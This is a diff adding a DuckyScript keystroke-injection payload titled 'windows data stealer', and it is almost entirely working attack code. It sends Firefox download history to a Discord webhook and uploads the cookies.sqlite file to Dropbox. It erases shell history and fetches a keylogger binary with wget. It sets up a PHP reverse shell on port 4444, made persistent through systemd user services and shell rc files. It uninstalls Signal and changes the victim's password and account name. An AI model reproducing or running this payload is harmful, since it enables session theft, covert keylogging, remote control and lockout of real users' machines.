@@ -1,0 +1,279 @@
+
+REM #                                                         |
+REM # Title:........ windows data stealer ............................|
+REM # Author       : youssef mohamed fathy                                                                   |                         |
+REM # Target       : Windows 10/11                            |
+REM #                                                         |
+
+
+
+REM Requirements:
+REM -fire fox
+
+
+DEFINE DISCORD_WEBHOOK example
+
+
+GUI r
+DELAY 1000
+STRING Firefox
+DELAY 500
+ENTER
+DELAY 2000
+
+
+CTRL j
+DELAY 500
+CTRL a
+DELAY 500
+CTRL c
+DELAY 500
+
+
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $DOWNLOADS="
+CTRL v
+DELAY 500
+ENTER
+
+
+DELAY 10000
+
+STRINGLN "
+
+
+STRING $WebhookUrl = "
+STRING DISCORD_WEBHOOK
+STRINGLN "
+
+STRINGLN $Payload = @{content = $DOWNLOADS} | ConvertTo-Json
+
+
+STRINGLN
+
+    $len = $DOWNLOADS.Length
+    $MAX_LEN = 1900
+
+    $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
+
+    for ($i = 0; $i -lt $ITERATIONS; $i++) {
+        $init = $i * $MAX_LEN
+        $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
+        
+        $sub = $DOWNLOADS.Substring($init, $end - $init)
+        $Payload = @{content = $sub} | ConvertTo-Json
+
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
+    }
+    exit;
+
+END_STRINGLN
+
+
+
+DEFINE DROPBOX_ACCESS_TOKEN "example"
+
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 2000
+
+
+
+STRINGLN
+    $firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
+    $firefoxProfile = Get-ChildItem -Path $firefoxProfilePath | Where-Object {$_.Name -like "*default-release"}
+
+    $filePath = Join-Path -Path $firefoxProfile.FullName -ChildPath 'cookies.sqlite'
+
+END_STRINGLN
+
+
+STRING $accessToken = 
+STRING DROPBOX_ACCESS_TOKEN
+ENTER
+
+STRINGLN
+    $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+
+$dropboxFilePath = "/cookies_exported.sqlite"
+
+ $headers = @{}
+    $headers.Add("Authorization", "Bearer $accessToken")
+    $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
+    $headers.Add("Content-Type", "application/octet-stream")
+
+    Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $filePath; exit;
+END_STRINGLN
+
+REM capture every keystroke , detailed key logs
+
+
+DELAY 500
+CTRL-ALT t
+DELAY 400
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 100
+
+
+STRING mkdir /var/tmp/.system
+ENTER
+DELAY 100
+STRING echo "/var/tmp/.system/./xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test" > /var/tmp/.system/sys 
+ENTER
+DELAY 100
+STRING chmod +x /var/tmp/.system/sys
+ENTER
+DELAY 100
+
+
+STRING cd /var/tmp/.system/
+ENTER
+DELAY 100
+STRING wget --no-check-certificate --content-disposition https://github.com/drapl0n/DuckyLogger/blob/main/xinput\?raw=true
+ENTER
+DELAY 2500
+STRING chmod +x xinput
+ENTER
+DELAY 100
+
+
+STRING echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"/var/tmp/.system/sys -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
+ENTER
+DELAY 100
+STRING chmod +x /var/tmp/.system/systemBus
+ENTER
+DELAY 100
+
+
+STRING mkdir -p ~/.config/systemd/user
+ENTER
+DELAY 200
+STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
+ENTER
+DELAY 100
+
+STRING echo "while true; do systemctl --user restart systemBUS.service; sleep 15m; done" > /var/tmp/.system/reboot
+ENTER
+DELAY 100
+STRING chmod +x /var/tmp/.system/reboot
+ENTER
+DELAY 100
+
+
+STRING echo -e "[Unit]\nDescription= System BUS handler reboot.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/reboot.service
+ENTER
+DELAY 100
+
+STRING systemctl --user daemon-reload
+ENTER
+DELAY 300
+STRING systemctl --user enable --now systemBUS.service
+ENTER
+DELAY 150
+STRING systemctl --user start --now systemBUS.service
+ENTER
+DELAY 150
+STRING systemctl --user enable --now reboot.service
+ENTER
+DELAY 150
+STRING systemctl --user start --now reboot.service
+ENTER
+DELAY 100
+
+
+STRING echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.bashrc\nfi" > ~/tmmmp
+ENTER
+DELAY 100
+STRING chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit
+ENTER
+
+REM unistal the signal
+
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+
+STRINGLN Stop-Process -Name "Signal"
+DELAY 500
+STRINGLN  Start-Process "$env:LocalAppData\Programs\signal-desktop\Uninstall Signal.exe"
+DELAY 1000
+
+ENTER
+ALT F4
+
+REM change user password
+
+DEFINE NEW_PASSWORD example
+
+DELAY 1000
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+REM LEFT_ARROW
+DELAY 500
+ENTER
+
+DELAY 2000
+STRING net user $env:USERNAME 
+STRING NEW_PASSWORD
+ENTER
+DELAY 1000
+
+ALT F4
+
+REM change Windows user name
+
+
+
+DEFINE NEW_NAME example
+
+DELAY 2000
+GUI r
+DELAY 1000
+
+
+STRING explorer
+ENTER
+DELAY 1000
+
+
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+STRING Control Panel\All Control Panel Items\User Accounts
+ENTER
+DELAY 1500
+
+
+TAB
+DELAY 500
+ENTER
+DELAY 500
+
+STRING NEW_NAME
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+ALT F4
